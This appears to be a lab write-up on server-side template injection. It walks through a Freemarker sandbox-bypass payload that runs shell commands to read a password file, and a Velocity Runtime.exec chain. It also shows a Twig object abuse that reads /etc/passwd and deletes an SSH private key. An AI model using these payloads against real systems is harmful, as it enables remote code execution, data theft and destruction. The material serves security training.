Until now we constructed an attack by:
- Reusing a documented exploit
- using well-known vulnerabilities in a template engine

But, sometimes you need to construct a custom exploit.

For example, you find that the template engine executes templates inside a `sandbox`, which makes the exploit difficult, or even impossible.

After identifying the attack surface, if no obvious way to exploit, you need to proceed with auditing techniques by reviewing each function for exploitable behavior, and sometimes you may be able to construct a complex attack.

**Constructing a Custom Exploit using an Object Chain**

The first step is to identify `objects` and `methods` to which you have access. Then put a shortlist of objects that you want to investigate.

When studying documents, pay attention to which methods these objects grant access to, and which objects they return.

In the documentation you can discover combinations of methods that you can chain together, and doing this with the right objects and methods sometimes you gain access to dangerous functionality and sensitive data.

For example, in `Velocity`, a Java-based template engine, you have access to `ClassTool` object called `$class`, and after studying the documentation you see that you can chain `$class.inspect()` method and `$class.type` property to obtain references to arbitrary objects.

This as used in the pas to execute shell commands on the target system:

`$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")`

### Lab. 5 Server-Side Template Injection in a Sandboxed Environment

**Description**

The lab uses `Freemarker` template engine, and it's vulnerable to server-side template injection due to its poorly implemented sandbox. Read the file `my_password.txt` from Carlos's home directory and submit the content of the file.

You can login with: `content-manager:C0nt3ntM4n4g3r`.

**Solution**

First I login with the given credentials, and view the details of a product.

There is an option to `Edit Template`, and in there I see that I have access to the `product` object.

![Pasted_image_20250127013550](https://github.com/user-attachments/assets/8039f426-fd2a-44e0-b56c-58a3c060af49)

I delete the unnecessary parts, and leave only the product object, to make the process simpler.

Let's just put something that doesn't exist, to see if we get an error, and see the template engine from there.

For example, instead of `product.price` i put `halil`.

There I see the error and it is written the template engine, which is `freemarker`.

![Pasted_image_20250127013737](https://github.com/user-attachments/assets/306915ad-fa27-4654-bf90-9ff7b06e08bf)

Now, there is a way here to explore the documentation for Java and to find a chain of methods that grant access to a class with a static method that lets you read files.

Another way is to see for some existing payloads, that will bypass the sandbox environment. Lets check on `Hacktricks` for `Freemarker`.

There is an available payload for the versions below 2.3.30:

```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

But, here we see that it uses the `article.class` but I don't know if we have that in our lab, so I will replace that with `product.class`.

There I see that I got some results back:

`<p>Hurry! Only 839 left of 3D Voice Assistants at uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) .</p>`

Let's try `whoami`, and I see that it return `carlos`.

With the `ls` it shows that there exists in the current directory the `my_password.txt`:

`<p>Hurry! Only 999 left of 3D Voice Assistants at my_password.txt .</p>`

Let's try to open that by putting `cat my_password.txt`.

And I got the contents:

`<p>Hurry! Only 138 left of 3D Voice Assistants at neksr5agpxyvd0yfjpuy.</p>`

which by providing them solves the lab.

----------

**Constructing a custom exploit using developer-supplied objects**

Sometimes templates run in a secure, locked-down environment and this makes the exploitation for RCE much more difficult, there may be still some ways.

As for example, to read files, as developer-created objects that are exposed to the template can offer a less-hardened attack surface.

Since, documentation for site-specific objects are hard to find, sometimes non-existent, the exploitation should be done by investigating the website's behavior manually and identify the attack surface, the n construct the custom exploit accordingly.

### Lab.6 Server-Side Template Injection with a Custom Exploit

**Description**
The goal of the lab is to create a custom exploit and delete the file `/.ssh/id_rsa` from Carlos's home directory.

`wiener:peter` can be used to login.

**Solution**

I login to the page with the given credentials, and there I'm provided with the option to update the email, change the preferred name, and choose an avatar.

We can also leave comments on the page.

So, the first step is to find some place when our input got reflected.

And for this we got three candidates now, and let's try it on the comments.

None of the payloads did work on the comment section:

![Pasted_image_20250127090511](https://github.com/user-attachments/assets/aa0e9e51-6a44-4f4d-81fb-d9b6871d376e)

Let's try the second candidate, by changing the preferred name. I change that to the nickname, and send the request to do that on Burp Repeater.

The body of the post request is:

```http
blog-post-author-display=user.nickname&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh
```

I'm going just to change the `blog-post-author-display` to `user.halil` and just see if that triggers some error.

And when I refresh the page, nothing shows on, not even the name of the user.

![Pasted_image_20250127090832](https://github.com/user-attachments/assets/74416549-7bb2-4f92-9f9f-cc870bace97c)

Let's try to make the request with just `user`.

And, now I got an error, which also tells the template engine which is `Twig`.

![Pasted_image_20250127090937](https://github.com/user-attachments/assets/38633669-576a-4608-8c3d-8cf7f0c944a1)

I'm going to try some Twig payloads in there now, such as `{{7*7}}` but that doesn't work:

![Pasted_image_20250127091324](https://github.com/user-attachments/assets/e4ee3746-c07f-41a9-9b55-c125afbca90d)

Let's revert it back to `user.nickname` in order to show the page, and try the avatar change.

It expects an image format, but let's try some other types of file, like a php. And there I got an error, but it tells us the function that is being used

```text
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/php in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/shell.php', 'text/php')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

Since this function is part of the object `User` let's just try this when we changed our preferred name, and instead of `user.nickname` make it `user.setAvatar()`.

![Pasted_image_20250127093003](https://github.com/user-attachments/assets/98ce8096-4da7-4b4e-8928-912c22d9aa47)

Based on this error we can conclude that the function works here as well, but we haven't passed two of the arguments that it expects.

Let's try to put the file first at `/etc/passwd` with the image mime type.

`user.setAvatar('/etc/passwd','image/png')`

Then when I load the comment that I posted, I see a link with a `broken image as avatar`, but let's copy the link to the avatar and make a `GET` request to it.

It downloaded the file, which contains the `/etc/passwd` content.

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
```

From one of the errors above, also the location of the `User` function got revealed, so let's try to read that one.

This, by sending a request to change the avatar with the following body:

`blog-post-author-display=user.setAvatar('//home/carlos/User.php','image/png')&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh`

And after refreshing the page, and sending a `GET` request to the avatar I got the `User.php`:

```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

Here there is the public function `gdprDelete` which deletes the avatar. 

In this case let's set the `id_rsa` file that we want to delete, as the avatar.

`blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh`

And now call the function to delete the avatar `blog-post-author-display=user.gdprDelete()&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh`, which in our case is the `id_rsa` file. And the lab is solved.